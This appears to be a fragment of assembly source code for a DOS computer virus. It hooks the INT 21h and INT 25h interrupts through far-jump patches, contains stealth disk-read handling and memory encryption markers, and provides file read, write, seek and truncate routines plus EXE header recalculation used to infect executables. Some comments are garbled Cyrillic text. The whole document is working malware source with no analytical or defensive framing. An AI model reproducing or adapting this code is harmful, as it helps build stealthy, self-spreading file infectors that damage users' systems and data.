;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel tmp1
    mov     cs:[vir_heap._after_goto], offset p1
    call    user_proc
    iret
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ















;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel call_real_25
    pushf
    push    es di si
    les     di, dword ptr cs:[offset25]
    lea     si, [vir_heap._five_bytes]
    cld
    SEGCS   movsw
    SEGCS   movsw
    SEGCS   movsb
    pop     si di es
    popf
    mov     cs:[vir_heap._abs_read_drive], al
    db      09Ah          ;call [RealInt25h]
pblabel offset25
    dd  ?
    pushf
    push    es di ax
    les     di, dword ptr cs:offset25
    cld
    mov     al, opJMPFAR       ;jmp far
    stosb
    lea     ax, memory_virentry ;stealth_abs_read
    stosw
    mov     ax, cs
    stosw
    pop     ax di es
    popf
    ret
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ






;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel memory_virentry
    pop       cs:[ret_sux]
    push      cs:[ret_sux]
    push ax
    mov       ax, cs:[vir_heap._hook]
    cmp       ax, cs:[ret_sux]
    pop ax
    DOIF NE ;"25"
       call call_real_25
        DOIF NC
            mov     cs:[vir_heap._after_goto], offset st25 ;-bfr_base
            call    user_proc
        DONE
;Äencrypt memoryÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        retf
;sssuxx db ?
    DONE
    pop     dword ptr cs:[ret_hook]
    add     cs:[ret_hook.lo], 6
;    mov     cs:[sssuxx], ah
;    cmp ah, 4Fh
;    DOIF E
;    int 2bh
;    DONE
    cmp     ah, 51h   ;reENTER virus, need for DRDOS
    DOIF E
continue21_1:
        jmp     continue21
    DONE
    mov     cs:[vir_heap._after_goto], offset selector21
    mov     byte ptr cs:[retu], opCMP_ALimm ;retu_off-retu-1
    call    user_proc ;selector; write new after_goto
    mov     byte ptr cs:[dos_cf], r2-r1
    call    user_proc ;before DOS of double selector
pblabel retu
    jmp     SHORT continue21_1
;    jmp     continue21
;Äencrypt memoryÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;pblabel retu_off
    call    DosCall   ;DOS
    db      opSEGCS, 0C7h, 06h
    dw      vir_heap._after_goto
pblabel after_dos_goto
    dw      UNINIT
    db      72h ;jc
pblabel dos_cf
    db        r2-r1
pblabel r1
    call      user_proc ;after DOS
pblabel r2
    sti ;!!!!!!!!!
;Äencrypt memoryÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
    retf      2
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ




;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel DosTruncate
   sub      cx, cx
pblabel doswrite_from_heap
   lea       dx, [heap] ;from heap
   jmp      doswrite
;-+------------------------------------------------------------------------+-
pblabel DosWrite_shbuf_22
    mov     cx, HDRBUFSIZE
pblabel DosWrite_shbuf
    lea     dx, [vir_heap._ziphdr]
pblabel DosWrite
    mov     ah, 40h
    jmp    DosCall_exc
;-+------------------------------------------------------------------------+-
pblabel read_buf_22
    mov     cx, HDRBUFSIZE
pblabel read_buf_cx
    lea     dx, [vir_heap._shift_buffer]
pblabel dosread
    mov     ah, 3Fh
pblabel DosCall_exc




    call    DosCall
    jnc    $$ret    ;®¡à ¡®âª  ®è¨¡®ª „‘  (?)
;int 2bh
;    cmp    [close_on_error], 3eh ;3e-no close
;    DOIF NE
;        call dosclose
;    DONE
    jmp rt_err  ; ¢®ááâ ­®¢¨âì SP ¨ ¢¥à­ãâìáï ¢ userproc
;-+------------------------------------------------------------------------+-

pblabel dosclose
    mov     ah, 3Eh
;    mov    [close_on_error], ah
    jmp     DosCall_exc
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ



;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel dostell
    xor     dx, dx
pblabel dosseek_cur_cx_0
    xor     cx, cx
    jmp     dosseek_cur
;-+------------------------------------------------------------------------+-
pblabel dosseek_cur_neg_ax
    xchg    dx, ax
pblabel dosseek_cur_neg_dx
    neg     dx
    jns     dosseek_cur_cx_0 ; if dx > 0
;-+------------------------------------------------------------------------+-
pblabel dosseek_cur_cx_1
    mov     cx, -1
pblabel dosseek_cur
    mov     al, 01h
    jmp     DosSeek_all
;-+------------------------------------------------------------------------+-
pblabel dosseek_bof
    sub     dx, dx
pblabel dosseek_cx_0
    sub     cx, cx
pblabel dosseek
    mov     al, 00h
pblabel DosSeek_all
    mov     ah, 42h
pblabel DosCall
    pushf
    push    cs
    call    continue21
$$ret:
    ret
pblabel seek_end
    mov     al, 02h ;seek_end
    xor     dx, dx
    xor     cx, cx
    jmp     DosSeek_all ;dx:ax - filesize
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ





;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel calc_hdr_pages
    mov     cx, 200h         ;  dx:ax - new size
    and     dx, 0fh
    div     cx
    mov     [exehdr.exe_len_mod_512], dx  ;ostatok
    add     dx, -1 ;dec dx ?
    adc     ax, 0
    mov     [exehdr.exe_pages], ax
    ret
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ




ends
end virus_entry








